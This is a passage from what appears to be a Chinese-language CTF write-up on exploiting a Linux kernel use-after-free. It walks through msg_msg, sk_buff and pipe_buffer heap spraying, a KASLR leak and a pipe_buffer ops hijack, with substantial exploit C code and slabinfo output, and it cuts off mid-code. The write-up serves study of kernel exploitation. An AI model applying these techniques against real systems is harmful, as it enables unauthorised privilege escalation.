<p>事实上，size在0x4000~0x7xxx大小之间的size都满足要求，所以成功率还要高一些</p>
</blockquote>
<p>要利用UAF,我们首先要将其<code>kfree</code>掉。通过<code>__kmalloc_large_noprof</code>函数得到的heap,在kfree的时候会直接触发page free，从而再次回到buddy system的order-3里边去<br>因此，我们就从order-3 page(size 0x8000)开始寻找利用手段</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="寻找堆喷对象"><a href="#寻找堆喷对象" class="headerlink" title="寻找堆喷对象"></a>寻找堆喷对象</h3><p>要取出order-3的page其实有挺多办法的，除了嗯喷<code>pipe_buffer</code>从order-0一路取到order-3之外，我们也可以通过申请新的对应大小的slab来正好取走这个order-3</p>
<blockquote>
<p>在第一步选用<code>pipe_buffer</code>需要堆喷大量的pipe，很容易超出最大文件打开限制（即使在修改rlimit的情况下）</p>
</blockquote>
<p>通过查看<code>/proc/slabinfo</code>中的内容，我们可以了解到不同的slab的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">cat</span> /proc/slabinfo | <span class="built_in">tail</span> -n 15</span><br><span class="line">kmalloc-8k             8      8   8192    4    8 : tunables    0    0    0 : slabdata      2      2      0</span><br><span class="line">kmalloc-4k            80     80   4096    8    8 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-2k           176    176   2048    8    4 : tunables    0    0    0 : slabdata     22     22      0</span><br><span class="line">kmalloc-1k           344    344   1024    8    2 : tunables    0    0    0 : slabdata     43     43      0</span><br><span class="line">kmalloc-512          392    392    512    8    1 : tunables    0    0    0 : slabdata     49     49      0</span><br><span class="line">kmalloc-256          496    496    256   16    1 : tunables    0    0    0 : slabdata     31     31      0</span><br><span class="line">kmalloc-128          320    320    128   32    1 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-64          1152   1152     64   64    1 : tunables    0    0    0 : slabdata     18     18      0</span><br><span class="line">kmalloc-32          1197   1280     32  128    1 : tunables    0    0    0 : slabdata     10     10      0</span><br><span class="line">kmalloc-16          1280   1280     16  256    1 : tunables    0    0    0 : slabdata      5      5      0</span><br><span class="line">kmalloc-8           1536   1536      8  512    1 : tunables    0    0    0 : slabdata      3      3      0</span><br><span class="line">kmalloc-192         1050   1050    192   21    1 : tunables    0    0    0 : slabdata     50     50      0</span><br><span class="line">kmalloc-96          3780   3780     96   42    1 : tunables    0    0    0 : slabdata     90     90      0</span><br><span class="line">kmem_cache_node      192    192     64   64    1 : tunables    0    0    0 : slabdata      3      3      0</span><br><span class="line">kmem_cache           160    160    256   16    1 : tunables    0    0    0 : slabdata     10     10      0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>该信息的部分格式如下：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; ...</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们聚焦第六行的&lt;pagesperslab&gt;，该项代表了每一个slab需要的page。可以发现kmalloc-4k和kmalloc-8k正好满足order-3 page(8页)的需求，因此我们尝试堆喷大小为0x1000(即kmalloc-4k)的结构体来触发<code>allocate_slab</code>函数，最终在函数<code>alloc_slab_page</code>中进行直接的order-3页分配</p>
<h3 id="错误的堆喷对象：struct-msg-msg"><a href="#错误的堆喷对象：struct-msg-msg" class="headerlink" title="错误的堆喷对象：struct msg_msg"></a>错误的堆喷对象：struct msg_msg</h3><p>事实上，我的第一反应就是<code>struct msg_msg</code>结构体，因为它kmalloc一次申请的大小最大就是0x1000，于是尝试堆喷<code>struct msg_msg</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_NUM 56</span></span><br><span class="line">  <span class="type">int</span> ms_qid[PRE_MSG_NUM];</span><br><span class="line">  <span class="type">char</span> *msg_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="type">char</span> *msg_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_NUM; ++i) &#123;</span><br><span class="line">    ms_qid[i] = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(msg_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write_msg(ms_qid[i], pre_msg_buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;pre spray msg_msg successfully\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始是没问题的，甚至不需要刻意喷射很多的结构体，一般第一波就能取到kfree后order-3 pages，通过UAF，我们可以构造条件满足<code>arandom_ioctl</code>中的要求，从而拿到内核基址绕过kaslr</p>
<p>之后问题来了，下一步我打算将<code>struct msg_msg</code> free掉，换成<code>pipe_buffer</code>来利用其随机任意写，却发现无论如何也堆喷不中。</p>
<p>最后在源码处发现问题，原来该内核版本中<code>struct msg_msg</code>的第一页的分配使用的是自己独立的kmem_cache:</p>
<blockquote>
<p>该特性其实在Linux v6.11版本就引入了</p>
</blockquote>
<figure class="highlight c"><figcaption><span>v6.14.2 完整版</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14.2/source/ipc/msgutil.c#L64">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"> <span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"> alen = min(len, DATALEN_MSG);</span><br><span class="line"> msg = kmem_buckets_alloc(msg_buckets, <span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL);</span><br><span class="line">  <span class="comment">// 这里不是kmalloc了</span></span><br><span class="line"> <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"> msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"> msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"> len -= alen;</span><br><span class="line"> pseg = &amp;msg-&gt;next;</span><br><span class="line"> <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">  cond_resched();</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_SEG);</span><br><span class="line">  seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="comment">// 这里仍然是kmalloc，但是我们很难利用</span></span><br><span class="line">  <span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">goto</span> out_err;</span><br><span class="line">  *pseg = seg;</span><br><span class="line">  seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">  pseg = &amp;seg-&gt;next;</span><br><span class="line">  len -= alen;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line"> free_msg(msg);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>msg_buckets</code>的定义就在其上方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> kmem_buckets *msg_buckets __ro_after_init;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_msg_buckets</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> msg_buckets = kmem_buckets_create(<span class="string">&quot;msg_msg&quot;</span>, SLAB_ACCOUNT,</span><br><span class="line">       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg),</span><br><span class="line">       DATALEN_MSG, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">subsys_initcall(init_msg_buckets);</span><br></pre></td></tr></table></figure>

<p>在slabinfo里边其实也有体现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">cat</span> /proc/slabinfo</span><br><span class="line">...</span><br><span class="line">msg_msg-8k             0      0   8192    4    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-4k             0      0   4096    8    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-2k             0      0   2048    8    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-1k             0      0   1024    8    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-512            0      0    512    8    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-256            0      0    256   16    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-128            0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-64             0      0     64   64    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-32             0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-16             0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-8              0      0      8  512    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-192            0      0    192   21    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-96             0      0     96   42    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可见多了和一般kmalloc-xxx一样的不同大小的slab,意味着它们不会与相同大小的kmalloc-xxx合并了，之前的想法属于cross-cache，除非构造cross-cache attack,否则是不可能成功的</p>
<h3 id="更换堆喷对象：struct-sk-buff"><a href="#更换堆喷对象：struct-sk-buff" class="headerlink" title="更换堆喷对象：struct sk_buff"></a>更换堆喷对象：struct sk_buff</h3><blockquote>
<p>为此专门看了一眼源码，确保是kmalloc了之后才采用的</p>
</blockquote>
<p>同样能完成读写数据的可供堆喷的结构体还有<code>struct sk_buff</code>，我们不能在一棵树上吊死</p>
<p>还是之前的思路，堆喷取数据验证，然后写数据满足条件，拿到内核基地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="comment">// INFO: Step 0x02: spray sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;spray sk_buff&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_reserve_size = <span class="number">320</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_size = page_size - skb_reserve_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> *skb_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    check(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]));</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf, (<span class="type">char</span>)i, skb_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf + offset, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x10</span>, &amp;AAA.rand_offset, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x18</span>, &amp;AAA.rand_size, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(write(sk_sockets[i][<span class="number">0</span>], skb_buf, skb_size));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray sk_buff successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: check &amp; read sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;check &amp; read sk_buff&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *skb_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1005</span>)); <span class="comment">// check</span></span><br><span class="line">  info(<span class="string">&quot;check buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;read sk_buff length %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(read(sk_sockets[i][<span class="number">1</span>], skb_recv, skb_size));</span><br><span class="line"></span><br><span class="line">      <span class="type">uint64_t</span> possible_addr = *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((possible_addr &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        success(<span class="string">&quot;find kernel addr at No.%d: %#lx\n&quot;</span>, i,</span><br><span class="line">                *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>));</span><br><span class="line">        kernel_base = possible_addr - calc(<span class="number">0xffffffff81907850</span>);</span><br><span class="line">        success(<span class="string">&quot;find kernel base: %#lx\n&quot;</span>, kernel_base);</span><br><span class="line">        <span class="keyword">goto</span> FIND;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (kernel_base == <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实这种堆喷在结构体<code>AAA</code>的<code>rand_size</code>满足kmalloc-4k的时候依旧管用，稍微增加了一点成功率</p>
</blockquote>
<p>依旧不用喷射很多对象就可以拿到该order-3。接下来就是将其free掉，换<code>pipe_buffer</code>上场尝试控制执行流</p>
<h3 id="控制执行流：struct-pipe-buffer"><a href="#控制执行流：struct-pipe-buffer" class="headerlink" title="控制执行流：struct pipe_buffer"></a>控制执行流：struct pipe_buffer</h3><p>之前说过，在没有smep&#x2F;smap的情况下，只要能让执行流导向用户空间，我们就能get root（当然前提是拿到基地址）。<br>因此，<code>pipe_buffer</code>这一可控大小，能够被劫持控制流（只需劫持函数表<code>struct pipe_buf_operations *ops</code>），且内容重复（为0x28大小的结构体数组），随机命中率高的结构体就自然而然地成为这一步利用的首选结构体</p>
<blockquote>
<p>太适合了</p>
</blockquote>
<p><code>struct sk_buff</code>在读完数据后自动<code>kfree</code>，而我取数据的方法就是将其读空，因此不需要额外操作将其free掉</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">FIND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">  &#125; pipe_example;</span><br><span class="line"></span><br><span class="line">  pipe_example.page = (<span class="type">void</span> *)<span class="number">0xffffea0000000000</span>;</span><br><span class="line">  pipe_example.len = <span class="number">0x1000</span>;</span><br><span class="line">  pipe_example.offset = <span class="number">0x0</span>;</span><br><span class="line">  pipe_example.ops = (<span class="type">void</span> *)calc(<span class="number">0xffffffff8222bb80</span>);</span><br><span class="line">  pipe_example.ops = <span class="literal">NULL</span>;</span><br><span class="line">  pipe_example.flags = <span class="number">0x10</span>;</span><br><span class="line">  pipe_example.private = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> pipe_buffer_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pipe_buffer size: %#lx\n&quot;</span>, pipe_buffer_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> inner_pipe_offset = offset % pipe_buffer_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(pipe_buf + <span class="number">0x8</span>, j, <span class="number">0x8</span>);</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>堆喷<code>pipe_buffer</code>并将其大小改成适合kmalloc-4k的，也是不需要很多就能取到刚被free的<code>sk_buff</code></p>
<p>最后一步就是回归最初的<code>arandom_ioctl</code>，调用其随机写的功能，尝试劫持控制流<br>其实就是一个很碰运气的过程，要求是只要能够将<code>pipe_buffer.ops</code>域覆写成一个用户态地址即可，在用户态我们直接mmap伪造其函数表导向提权代码即可<br>如果真碰运气中了，只需将其close掉就能触发了</p>
<blockquote>
<p>原理就是<code>pipe_buffer</code>在close的过程中会调用函数<code>free_pipe_info</code>，其关键内容如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>可见，它不管你其他地方有没有数据，只要ops域不为0,就尝试调用（该循环还是遍历所有<code>pipe_buffer</code>结构体数组的）<br>因此，只要往上边写上东西，就能劫持控制流了</p>
</blockquote>
<p>最后一部分</p>
<blockquote>
<p>其实这个随机验证是否覆写<code>pipe_buffer.ops</code>域完全可以放在最前边</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// INFO: Step 0x05: write random value</span></span><br><span class="line">step(<span class="string">&quot;write random value&quot;</span>);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;inner pipe offset: %#x\n&quot;</span>, inner_pipe_offset);</span><br><span class="line">info(<span class="string">&quot;before writting:\n&quot;</span>);</span><br><span class="line">dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">char</span> *)(&amp;pipe_example) + inner_pipe_offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">check(ioctl(fd, <span class="number">0x1003</span>)); <span class="comment">// write</span></span><br><span class="line">info(<span class="string">&quot;write buffer+%#x &lt;- %#x\n&quot;</span>, AAA.rand_offset, AAA.rand_value);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;after writting:\n&quot;</span>);</span><br><span class="line">dump_hex((<span class="type">char</span> *)&amp;pipe_example, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *fake_ops = pipe_example.ops;</span><br><span class="line"><span class="type">void</span> *fake_ops_page = (<span class="type">void</span> *)((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xFFFFFFFFFffff000</span>);</span><br><span class="line"><span class="type">uint32_t</span> fake_ops_page_offset = ((<span class="type">uint64_t</span>)fake_ops &amp; <span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pipe_example.ops == <span class="literal">NULL</span>) &#123;</span><br><span class="line">  err_exit(<span class="string">&quot;Useless write&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;affect pipe_buffer&#x27;s ops successfully\n&quot;</span>);</span><br><span class="line">success(<span class="string">&quot;pipe_buffer&#x27;s ops: %p\n&quot;</span>, pipe_example.ops);</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;mmap page %p\n&quot;</span>, fake_ops_page);</span><br><span class="line"><span class="type">void</span> *mmap_page = mmap(fake_ops_page, <span class="number">0x3000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span 